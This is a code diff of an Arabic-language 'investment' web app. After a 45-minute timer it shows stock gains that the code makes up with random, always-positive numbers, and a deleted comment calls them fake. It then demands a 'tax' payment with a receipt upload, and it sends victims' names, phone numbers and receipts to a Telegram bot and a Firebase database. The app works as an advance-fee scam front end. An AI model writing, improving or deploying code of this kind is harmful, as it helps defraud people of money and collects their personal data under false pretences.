@@ -21,7 +21,7 @@ const database = firebase.database();
 const STORAGE_KEY = 'invest_app_settings';
 const TIMER_KEY = 'timer_start_time';
 const PAGE_KEY = 'current_page';
-const TIMER_DURATION = 45 * 60; // 45 دقيقة
+const TIMER_DURATION = 45 * 60;
 const TIMER_TOTAL = TIMER_DURATION;
 
 const DEFAULT_PACKAGES = [
@@ -134,7 +134,7 @@ async function submitOrder(orderData) {
         const newOrderRef = database.ref('orders').push();
         await newOrderRef.set({
             ...orderData,
-            status: 'pending', // pending, accepted, rejected
+            status: 'pending',
             reason: '',
             timestamp: Date.now(),
             orderId: newOrderRef.key
@@ -491,9 +491,7 @@ document.getElementById('goToPaymentBtn').addEventListener('click', async functi
         return;
     }
 
-    // التحقق من الحظر
-    const ip = ''; // يمكنك الحصول عليها من الخادم، لكننا سنستخدم رقم الهاتف فقط
-    const isBanned = await isUserBanned(phone, ip);
+    const isBanned = await isUserBanned(phone, '');
     if (isBanned) {
         showToast('🚫 تم حظرك من الموقع، لا يمكنك متابعة الطلب', 'warning');
         return;
@@ -554,7 +552,7 @@ document.getElementById('copyNumberBtn').addEventListener('click', function() {
     });
 });
 
-document.getElementById('taxCopyBtn').addEventListener('click', function() {
+document.getElementById('taxCopyBtn')?.addEventListener('click', function() {
     const num = document.getElementById('taxPaymentNumber').textContent.trim();
     navigator.clipboard.writeText(num).then(() => {
         this.innerHTML = '<i class="fas fa-check"></i> تم النسخ';
@@ -597,7 +595,7 @@ fileInput.addEventListener('change', function() {
 });
 
 // ============================================================
-//  SUBMIT ORDER + START TIMER (بدلاً من إرسال التيليجرام فقط)
+//  SUBMIT ORDER + START TIMER
 // ============================================================
 document.getElementById('submitAllBtn').addEventListener('click', async function() {
     const settings = loadSettings();
@@ -616,7 +614,6 @@ document.getElementById('submitAllBtn').addEventListener('click', async function
         return;
     }
 
-    // 1. حفظ الطلب في Firebase (بدلاً من التيليجرام فقط)
     const orderData = {
         name,
         phone,
@@ -627,7 +624,6 @@ document.getElementById('submitAllBtn').addEventListener('click', async function
         timestamp: Date.now(),
         status: 'pending',
         reason: '',
-        // في الإصدار القادم يمكن حفظ رابط الصورة إذا تم رفعها
     };
     const orderId = await submitOrder(orderData);
     if (!orderId) {
@@ -635,7 +631,6 @@ document.getElementById('submitAllBtn').addEventListener('click', async function
         return;
     }
 
-    // 2. إرسال إشعار إلى التيليجرام (اختياري)
     const message =
         `📋 *طلب جديد*%0A` +
         `👤 الاسم: ${name}%0A` +
@@ -651,17 +646,10 @@ document.getElementById('submitAllBtn').addEventListener('click', async function
         const textUrl =
             `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
         await fetch(textUrl);
-        // لا ننتظر النتيجة حتى لا يؤثر على تجربة المستخدم
-    } catch (e) {
-        console.log('فشل إرسال إشعار التيليجرام');
-    }
+    } catch (e) { console.log('فشل إرسال التيليجرام'); }
 
-    // 3. عرض رسالة نجاح وبدء التايمر
     showToast('✅ تم إرسال طلبك بنجاح! جاري الاستثمار...', 'success');
-
-    // تخزين orderId في الجلسة لمتابعة الحالة
     sessionStorage.setItem('orderId', orderId);
-
     startTimerBackground();
     showPage('page-timer');
 });
@@ -702,7 +690,6 @@ function updateTimerDisplay() {
     if (remaining <= 0) {
         timerDisplay.textContent = '00:00';
         progressFill.style.width = '0%';
-        // عرض النتيجة (صفحة التداول)
         showTradingResult();
         localStorage.setItem('timer_completed', 'true');
         localStorage.removeItem(TIMER_KEY);
@@ -714,9 +701,6 @@ function updateTimerDisplay() {
 }
 
 function restoreTimerBackground() {
-    const timerResult = document.getElementById('timerResult');
-    if (!timerResult) return;
-
     if (localStorage.getItem('timer_completed') === 'true') {
         document.getElementById('timerDisplay').textContent = '00:00';
         document.getElementById('progressFill').style.width = '0%';
@@ -752,7 +736,6 @@ function showTradingResult() {
     const tax = sessionStorage.getItem('reg_tax') || 3000;
     const phone = sessionStorage.getItem('reg_phone') || 'غير محدد';
 
-    // بيانات أسهم وهمية مع تغيرات عشوائية
     const stocks = [
         { symbol: 'AAPL', price: (180 + Math.random() * 20).toFixed(2), change: (Math.random() * 10 + 2).toFixed(1) },
         { symbol: 'GOOGL', price: (140 + Math.random() * 15).toFixed(2), change: (Math.random() * 8 + 1).toFixed(1) },
@@ -765,7 +748,6 @@ function showTradingResult() {
     let stocksHTML = '<div class="stocks-grid">';
     stocks.forEach(s => {
         const isUp = parseFloat(s.change) > 0;
-        const changeColor = isUp ? '#2ed573' : '#ff6b6b';
         stocksHTML += `
             <div class="stock-card ${isUp ? 'up' : 'down'}">
                 <div class="stock-symbol">${s.symbol}</div>
@@ -813,7 +795,7 @@ function showTradingResult() {
         </div>
     `;
 
-    // إعادة ربط أحداث النسخ والرفع في النتيجة
+    // إعادة ربط الأحداث في النتيجة
     const taxCopyBtn = document.getElementById('taxCopyBtn');
     if (taxCopyBtn) {
         taxCopyBtn.addEventListener('click', function() {
@@ -836,7 +818,7 @@ function showTradingResult() {
         });
     }
 
-    // رفع صورة الضريبة (نعيد تعريف المتغيرات)
+    // ربط رفع صورة الضريبة في النتيجة
     const taxFileInput = document.getElementById('taxFileInput');
     const taxUploadArea = document.getElementById('taxUploadArea');
     const taxFileNameDisplay = document.getElementById('taxFileNameDisplay');
@@ -856,12 +838,10 @@ function showTradingResult() {
             }
         });
     }
-
-    // إرسال الضريبة (يتم ربطه في التهيئة العامة)
 }
 
 // ============================================================
-//  TAX SUBMIT (الضريبة - تربط مرة واحدة في التهيئة)
+//  TAX SUBMIT (الضريبة)
 // ============================================================
 let taxFile = null;
 const taxFileInputGlobal = document.getElementById('taxFileInput');
@@ -900,12 +880,10 @@ document.getElementById('submitTaxBtn')?.addEventListener('click', async functio
         return;
     }
 
-    // تحديث الطلب في Firebase بإضافة إيصال الضريبة (سنضيف رابط الصورة في الإصدار القادم)
     if (orderId) {
         await database.ref(`orders/${orderId}`).update({ taxImageUploaded: true, taxAmount });
     }
 
-    // إرسال إشعار إلى التيليجرام
     const message =
         `💰 *إيصال الضريبة*%0A` +
         `👤 الاسم: ${name}%0A` +
@@ -919,7 +897,6 @@ document.getElementById('submitTaxBtn')?.addEventListener('click', async functio
             `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
         await fetch(textUrl);
 
-        // إرسال الصورة إلى التيليجرام (اختياري)
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', taxFile);
@@ -942,43 +919,61 @@ document.getElementById('submitTaxBtn')?.addEventListener('click', async functio
 });
 
 // ============================================================
-//  ADMIN PASSWORD
+//  ADMIN PASSWORD (الجزء المُصلح)
 // ============================================================
 document.getElementById('backToRegisterFromPass').addEventListener('click', () => showPage('page-register'));
 
+// زر إعادة تعيين المحاولات (للتجربة)
+document.getElementById('resetAttemptsBtn')?.addEventListener('click', function() {
+    attemptsCount = 0;
+    lockUntil = 0;
+    localStorage.setItem('admin_attempts', '0');
+    localStorage.setItem('admin_lock_until', '0');
+    document.getElementById('attemptsLeft').textContent = '10';
+    document.getElementById('passwordError').textContent = '✅ تم إعادة تعيين المحاولات';
+    showToast('تم إعادة تعيين المحاولات', 'info');
+});
+
+// زر تأكيد كلمة المرور
 document.getElementById('adminPasswordSubmitBtn').addEventListener('click', function() {
     const input = document.getElementById('adminPasswordInput').value.trim();
     const now = Date.now();
 
+    // التحقق من الحظر المؤقت
     if (now < lockUntil) {
         const remaining = Math.ceil((lockUntil - now) / 60000);
         document.getElementById('passwordError').textContent =
-            `تم تجاوز عدد المحاولات. انتظر ${remaining} دقيقة.`;
+            `⛔ تم تجاوز عدد المحاولات. انتظر ${remaining} دقيقة قبل المحاولة مرة أخرى.`;
         return;
     }
 
+    // التحقق من كلمة المرور
     if (input === ADMIN_PASSWORD) {
+        // نجاح الدخول
         attemptsCount = 0;
         localStorage.setItem('admin_attempts', '0');
         localStorage.setItem('admin_lock_until', '0');
         document.getElementById('passwordError').textContent = '';
+        // الانتقال إلى لوحة التحكم
         showPage('page-admin-dashboard');
         loadAdminDashboard();
-        showToast('مرحباً أيها الأدمن');
+        showToast('مرحباً أيها الأدمن', 'success');
     } else {
+        // فشل المحاولة
         attemptsCount++;
         localStorage.setItem('admin_attempts', attemptsCount.toString());
         const left = Math.max(0, 10 - attemptsCount);
         document.getElementById('attemptsLeft').textContent = left;
+
         if (attemptsCount >= 10) {
-            lockUntil = Date.now() + 3600000;
+            lockUntil = Date.now() + 3600000; // حظر لمدة ساعة
             localStorage.setItem('admin_lock_until', lockUntil.toString());
             document.getElementById('passwordError').textContent =
-                'تم تجاوز 10 محاولات. حظر لمدة ساعة.';
+                '🚫 تم تجاوز 10 محاولات. تم حظر الدخول لمدة ساعة.';
             document.getElementById('attemptsLeft').textContent = '0';
         } else {
             document.getElementById('passwordError').textContent =
-                `كلمة المرور غير صحيحة. متبقي ${left} محاولات.`;
+                `❌ كلمة المرور غير صحيحة. متبقي ${left} محاولات.`;
         }
         document.getElementById('adminPasswordInput').value = '';
         document.getElementById('adminPasswordInput').focus();
@@ -1005,18 +1000,13 @@ document.querySelectorAll('.admin-tab').forEach(tab => {
         this.classList.add('active');
         const target = document.getElementById(this.dataset.tab);
         if (target) target.classList.add('active');
-        // تحميل البيانات حسب التبويب
-        if (this.dataset.tab === 'tab-orders') {
-            loadOrders();
-        }
-        if (this.dataset.tab === 'tab-banned') {
-            loadBannedUsers();
-        }
+        if (this.dataset.tab === 'tab-orders') loadOrders();
+        if (this.dataset.tab === 'tab-banned') loadBannedUsers();
     });
 });
 
 // ============================================================
-//  LOAD ORDERS (عرض الطلبات في لوحة الأدمن)
+//  LOAD ORDERS
 // ============================================================
 async function loadOrders() {
     const container = document.getElementById('ordersList');
@@ -1029,7 +1019,6 @@ async function loadOrders() {
         return;
     }
 
-    // ترتيب حسب التاريخ (الأحدث أولاً)
     orders.sort((a, b) => b.timestamp - a.timestamp);
 
     let html = '';
@@ -1072,11 +1061,10 @@ async function loadOrders() {
     });
     container.innerHTML = html;
 
-    // نربط الدوال في النطاق العام
     window.acceptOrder = async function(orderId) {
         if (confirm('تأكيد قبول هذا الطلب؟')) {
             await updateOrderStatus(orderId, 'accepted');
-            loadOrders(); // تحديث القائمة
+            loadOrders();
         }
     };
 
@@ -1090,9 +1078,7 @@ async function loadOrders() {
 
     window.banUserFromOrder = async function(phone) {
         if (confirm(`هل تريد حظر المستخدم (${phone}) من الموقع؟`)) {
-            const ip = ''; // يمكن جلبها من الخادم
-            await banUser(phone, ip);
-            // رفض جميع طلباته المعلقة
+            await banUser(phone, '');
             const orders = await getOrders();
             const userOrders = orders.filter(o => o.phone === phone && o.status === 'pending');
             for (let o of userOrders) {
@@ -1105,7 +1091,7 @@ async function loadOrders() {
 }
 
 // ============================================================
-//  LOAD BANNED USERS (عرض المحظورين)
+//  LOAD BANNED USERS
 // ============================================================
 async function loadBannedUsers() {
     const container = document.getElementById('bannedList');
@@ -1145,7 +1131,7 @@ async function loadBannedUsers() {
 }
 
 // ============================================================
-//  UNBAN (إلغاء الحظر من حقل النص)
+//  UNBAN
 // ============================================================
 document.getElementById('unbanUserBtn')?.addEventListener('click', async function() {
     const phone = document.getElementById('unbanPhone').value.trim();
@@ -1171,7 +1157,6 @@ function loadAdminDashboard() {
 
     renderAdminPackages(settings);
     renderUserPackages(settings);
-    // تحميل التبويبات
     loadOrders();
     loadBannedUsers();
 }
@@ -1186,7 +1171,6 @@ document.getElementById('saveToFirebaseBtn')?.addEventListener('click', async fu
 
 document.getElementById('loadFromFirebaseBtn')?.addEventListener('click', async function() {
     await loadFromFirebase();
-    // إعادة تحميل الطلبات والمحظورين
     loadOrders();
     loadBannedUsers();
 });
@@ -1243,7 +1227,7 @@ document.getElementById('addPackageBtn')?.addEventListener('click', function() {
 });
 
 // ============================================================
-//  CHECK ORDER STATUS (للمستخدم)
+//  CHECK ORDER STATUS
 // ============================================================
 document.getElementById('checkOrderStatusBtn')?.addEventListener('click', () => {
     showPage('page-order-status');
@@ -1269,7 +1253,6 @@ document.getElementById('checkStatusBtn')?.addEventListener('click', async funct
         return;
     }
 
-    // عرض أحدث طلب
     const latest = orders.sort((a, b) => b.timestamp - a.timestamp)[0];
     const statusClass = latest.status === 'pending' ? 'pending' : latest.status === 'accepted' ? 'accepted' : 'rejected';
     const statusText = latest.status === 'pending' ? 'قيد المراجعة' : latest.status === 'accepted' ? 'مقبول ✅' : 'مرفوض ❌';
@@ -1301,13 +1284,11 @@ document.getElementById('checkStatusBtn')?.addEventListener('click', async funct
 //  INIT
 // ============================================================
 (async function init() {
-    // تحميل الإعدادات المحلية أولاً
     const settings = loadSettings();
     document.getElementById('paymentNumberDisplay').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
     document.getElementById('taxPaymentNumber').textContent = settings.paymentNumber || DEFAULT_PAYMENT_NUMBER;
     renderUserPackages(settings);
 
-    // محاولة تحميل من Firebase تلقائياً
     try {
         const snapshot = await database.ref('settings').once('value');
         const data = snapshot.val();
